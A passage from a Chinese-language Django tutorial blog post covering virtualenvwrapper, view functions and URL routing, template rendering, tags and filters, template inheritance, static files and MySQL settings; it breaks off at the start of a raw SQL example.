title="virtualenvwrapper"></a>virtualenvwrapper</h3><p>通过这个软件包管理虚拟环境。</p><ul><li><p>安装virtualenvwrapper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mac/linux: pip install virtualenvwrapper</span><br><span class="line">windows: pip install virtualenvwrapper-win</span><br></pre></td></tr></table></figure></li><li><p>创建虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv django-env</span><br></pre></td></tr></table></figure></li><li><p>切换到某个虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">workon django-env</span><br></pre></td></tr></table></figure></li><li><p>删除某个虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmvirtualenv django-env</span><br></pre></td></tr></table></figure></li><li><p>列出所有虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsvirtualenv</span><br></pre></td></tr></table></figure></li><li><p>进入到虚拟环境所在的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdvirtualenv</span><br></pre></td></tr></table></figure></li><li><p>创建虚拟环境的时候指定python版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv --python==C:\Python36\python.exe python3-env</span><br><span class="line">mkvirtualenv --python==C:\Python27\python.exe python2-env</span><br></pre></td></tr></table></figure></li></ul><h2 id="URL与视图"><a href="#URL与视图" class="headerlink" title="URL与视图"></a>URL与视图</h2><h3 id="视图函数"><a href="#视图函数" class="headerlink" title="视图函数"></a>视图函数</h3><ul><li>视图函数的第一个参数必须是request</li><li>视图函数的返回值必须是<code>django.http.response.HttpResponseBase</code>的子类的对象。<h3 id="url传参"><a href="#url传参" class="headerlink" title="url传参"></a>url传参</h3></li><li><p>views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">book</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'图书首页'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">book_detail</span><span class="params">(request,book_id)</span>:</span></span><br><span class="line">    text =<span class="string">"您获取的图书id是：%s"</span> % book_id</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_detail</span><span class="params">(request)</span>:</span></span><br><span class="line">    author_id=request.GET.get(<span class="string">'id'</span>)</span><br><span class="line">    text= <span class="string">'作者的id是: %s'</span> % author_id</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(text)</span><br></pre></td></tr></table></figure></li><li><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> book <span class="keyword">import</span> views</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'首页'</span>)</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'admin/'</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">'book/'</span>,views.book),</span><br><span class="line">    path(<span class="string">''</span>,index),</span><br><span class="line">    path(<span class="string">'book/detail/&lt;book_id&gt;'</span>,views.book_detail),</span><br><span class="line">    path(<span class="string">'book/author/'</span>,views.author_detail)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul><h3 id="url命名"><a href="#url命名" class="headerlink" title="url命名"></a>url命名</h3><ul><li><p>用name参数命名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path(&apos;login/&apos;,views.login,name=&apos;login&apos;)</span><br></pre></td></tr></table></figure></li><li><p>在重定向时使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import redirect,reverse</span><br><span class="line">...</span><br><span class="line">return redirect(reverse(&apos;login&apos;))</span><br></pre></td></tr></table></figure></li><li><p>如果多个app里有同名的url,则需要使用应用命名空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义命名空间，在app的urls.py中</span></span><br><span class="line">app_name=<span class="string">'cms'</span></span><br><span class="line"><span class="comment">#要做反转的时候</span></span><br><span class="line">login_url=reverse(<span class="string">'cms:login'</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="Django模板"><a href="#Django模板" class="headerlink" title="Django模板"></a>Django模板</h2><h3 id="模板介绍"><a href="#模板介绍" class="headerlink" title="模板介绍"></a>模板介绍</h3><ul><li><code>DTL</code>: <code>Django Template Language</code></li></ul><h3 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h3><p>模板渲染有多种方式，这里列两种常用方式。</p><ul><li><p><code>render_to_string</code>:找到模板，然后将模板编译后渲染成Python的字符串格式，最后再通过<code>HttpResponse</code>类包装成一个<code>HttpResponse</code>对象返回。示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.template.loader <span class="keyword">import</span>  render_to_string</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    html=render_to_string(<span class="string">"index.html"</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(html)</span><br></pre></td></tr></table></figure></li><li><p>django还提供了一个更简便的方式，直接将模板渲染成字符串和包装成HttpResponse对象一步到位完成。示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'index.html'</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="模板查找路径"><a href="#模板查找路径" class="headerlink" title="模板查找路径"></a>模板查找路径</h3><p>在项目的<code>settings.py</code>文件中，有一个TEMPLATES配置，包含了模板引擎的配置，模板查找路径的配置，模板上下文的配置。</p><ul><li><p><code>DIRS</code>:存放所有模板的路径，会优先在这个路径查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'DIRS'</span>: [os.path.join(BASE_DIR, <span class="string">'templates'</span>)]</span><br></pre></td></tr></table></figure></li><li><p><code>APP_DIRS</code>:默认为True，会在INSTALLED_APPS的安装了的app下的templates文件中查找模板。</p></li><li>查找顺序:首先在<code>DIRS</code>，然后是在当前视图所处的app下的templates文件夹中查找(已经在INSTALLED_APPS中添加)，最后是在其他已经安装了的app中查找。</li></ul><h3 id="模板变量"><a href="#模板变量" class="headerlink" title="模板变量"></a>模板变量</h3><ol><li>模板中使用变量，需要将变量放到<code></code>中。</li></ol><ul><li><p>views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'chenxiyuan'</span>,</span><br><span class="line">        <span class="string">'list'</span>: [<span class="string">'aka'</span>,<span class="string">'bim'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'index.html'</span>,context=context)</span><br></pre></td></tr></table></figure></li><li><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Welcome &#123;&#123; username &#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">AND &#123;&#123; list.1 &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>访问对象:<code>对象.属性</code></li><li>访问字典的key对应的value:<code>字典.key</code>，不能通过中括号<code>[]</code>形式访问。</li><li>访问列表或者元组:都只能通过<code>.</code>的方式访问，不能通过中括号<code>[]</code>访问<h3 id="常用的模板标签"><a href="#常用的模板标签" class="headerlink" title="常用的模板标签"></a>常用的模板标签</h3></li><li><p>注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;# ... #&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>if</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ... %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>for in</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for ... in ... %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"># 反向遍历，可以在后面加一个reversed</span><br></pre></td></tr></table></figure></li><li><p><code>url</code>标签</p></li></ol><ul><li><p>类似django中的reverse反转一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&#123;% url &apos;book:list&apos; %&#125;&quot;&gt;图书列表页面&lt;/a&gt;</span><br></pre></td></tr></table></figure></li><li><p>带参数传递的url反转,分为位置参数和关键字参数，注意两个不能同时使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#path部分</span><br><span class="line">path(&apos;detail/&lt;book_id&gt;/&apos;,views.book_detail,name=&apos;detail&apos;)</span><br><span class="line">#位置参数</span><br><span class="line">&lt;a href=&quot;&#123;% url &apos;book:detail&apos; 1 %&#125;&quot;&gt; 图书详情页面&lt;/a&gt;</span><br><span class="line">#关键字参数</span><br><span class="line">&lt;a href=&quot;&#123;% url &apos;book:detail&apos; book_id=1 %&#125;&quot;&gt;图书详情页面&lt;/a&gt;</span><br></pre></td></tr></table></figure></li><li><p>传递查询字符串参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&#123;% url &apos;book:detail&apos; book_id=1 %&#125;?page=1&quot;&gt;图书详情页面&lt;/a&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="模板过滤器"><a href="#模板过滤器" class="headerlink" title="模板过滤器"></a>模板过滤器</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>将传进来的参数添加到原来的值上面。源代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(value, arg)</span>:</span></span><br><span class="line">    <span class="string">"""Add the arg to the value."""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> int(value) + int(arg)</span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> value + arg</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure></p><ul><li><p>views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello "</span>+name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'hello'</span>:<span class="string">'hello'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'index.html'</span>,context=context)</span><br></pre></td></tr></table></figure></li><li><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&#123;&#123; hello|add:"chenxiyuan" &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h4><p>移除值中所指定的字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 移除value中所有的空格字符</span><br><span class="line">&#123;&#123;value|cut:&quot; &quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>源代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut</span><span class="params">(value, arg)</span>:</span></span><br><span class="line">    <span class="string">"""Remove all values of arg from the given string."""</span></span><br><span class="line">    safe = isinstance(value, SafeData)</span><br><span class="line">    value = value.replace(arg, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> safe <span class="keyword">and</span> arg != <span class="string">';'</span>:</span><br><span class="line">        <span class="keyword">return</span> mark_safe(value)</span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure></p><h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p>将日期按照指定格式格式化成字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#数据</span><br><span class="line">context = &#123;</span><br><span class="line">&quot;time&quot;: datatime.now()</span><br><span class="line">&#125;</span><br><span class="line">#模板</span><br><span class="line">&#123;&#123;time|date:&quot;Y-m-d&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>输出2019-07-15 </p><h3 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h3><h4 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h4><ul><li>虚拟环境下新建frontapp:python manage.py startapp front</li><li><p>views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'晨曦远'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'index.html'</span>,context=context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'home.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">about</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'about.html'</span>)</span><br></pre></td></tr></table></figure></li><li><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> front <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">''</span>, views.index,name=<span class="string">"index"</span>),</span><br><span class="line">    path(<span class="string">'home/'</span>,views.home,name=<span class="string">'home'</span>),</span><br><span class="line">    path(<span class="string">'about/'</span>,views.about,name=<span class="string">'about'</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>base.html:父模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>个人中心<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'about' %&#125;"</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; username &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">    &#123;% block content %&#125;</span><br><span class="line">        父模板中content的代码</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    &#123;# 如果父模板block里有内容，会被子模板覆盖掉 #&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是首页<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    &#123;# 如果想继承父模板block内容，需要使用block.super #&#125;</span><br><span class="line">    &#123;&#123; block.super &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li><li><p>home.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    个人中心</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li><li><p>about.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    关于页面</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="加载静态文件"><a href="#加载静态文件" class="headerlink" title="加载静态文件"></a>加载静态文件</h4><ol><li>确保<code>settings.py</code>的<code>INSTALLED_APPS</code>已经安装了<code>django.contrib.staticfiles</code></li><li>确保<code>settings.py</code>中设置了<code>STATIC_URL</code></li><li>新建app，添加到<code>INSTALLED_APPS</code>,然后在此app下新建一个static文件夹，再创建一个同名app文件夹保存静态文件，以免不同app有同名的静态文件产生混淆</li><li><p>在模板中使用<code>load</code>标签加载<code>static</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static%&#125;</span><br><span class="line">...</span><br><span class="line">&lt;img src=&quot;&#123;% static &apos;logo.jpg&apos; %&#125;&quot; alt=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>如果静态文件不与app挂钩，则可以在主程序同路径下新建static文件夹存放静态文件,在<code>settings.py</code>里设置路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">STATICFILES_DIRS = [</span><br><span class="line">os.path.join(BASE_DIR,<span class="string">'static'</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ol><h2 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h2><h3 id="mysql驱动程序安装"><a href="#mysql驱动程序安装" class="headerlink" title="mysql驱动程序安装"></a>mysql驱动程序安装</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install mysqlclient</span><br></pre></td></tr></table></figure><h3 id="配置数据库连接"><a href="#配置数据库连接" class="headerlink" title="配置数据库连接"></a>配置数据库连接</h3><p>在<code>settings.py</code>文件里配置<code>DATABASES</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">'default'</span>: &#123;</span><br><span class="line">        <span class="string">'ENGINE'</span>: <span class="string">'django.db.backends.mysql'</span>,</span><br><span class="line">        <span class="string">'NAME'</span>: <span class="string">'webtest'</span>,</span><br><span class="line">        <span class="string">'USER'</span>: <span class="string">'root'</span>,</span><br><span class="line">        <span class="string">'PASSWORD'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'HOST'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'PORT'</span>: <span class="string">'3306'</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="原生sql语句操作数据库"><a href="#原生sql语句操作数据库" class="headerlink" title="原生sql语句操作数据库"></a>原生sql语句操作数据库</h3><h4 id="使用connection对象"><a href="#使用connection对象" class="headerlink" title="使用connection对象"></a>使用connection对象</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> connection</span><br><span 